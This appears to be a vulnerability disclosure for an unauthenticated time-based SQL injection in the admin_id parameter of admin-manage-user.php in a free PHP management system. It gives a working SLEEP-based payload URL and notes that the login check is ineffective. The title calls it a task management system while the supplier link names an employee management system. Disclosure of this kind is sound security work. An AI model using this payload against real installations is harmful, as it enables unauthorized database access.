# php task management system free download - SQL injection vulnerability

### You do not need to log in to the website to remotely trigger SQL injection vulnerabilities!

Supplier:https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html

http://localhost/admin-manage-user.php?delete_user=1&admin_id=1   -----> 'admin_id' can control some admin_id parameters

Payload:admin-manage-user.php?delete_user=1&admin_id=1%20AND%20(SELECT%20a%20FROM%20(SELECT(SLEEP(10)))U)

When you execute this payload, you will notice a delay of around 10 seconds. This indicates that the sleep statement has been successfully executed in the database, causing a SQL injection vulnerability.

![1](https://github.com/xuanluansec/vul/blob/main/vul/img/2.png)

The parameter received on line 22 of the admin-manage-user.php file in the website's root directory triggers a SQL injection vulnerability until line 26.

![2](https://github.com/xuanluansec/vul/blob/main/vul/img/1.png)

Note: I noticed that there is code ```require 'authentication.php';``` on line 2 of admin-manage-user.php, which seems to be related to login validation, but it is not effective. I was able to successfully perform SQL injection while unauthorized.

![3](https://github.com/xuanluansec/vul/blob/main/vul/img/4.png)

![4](https://github.com/xuanluansec/vul/blob/main/vul/img/3.png)
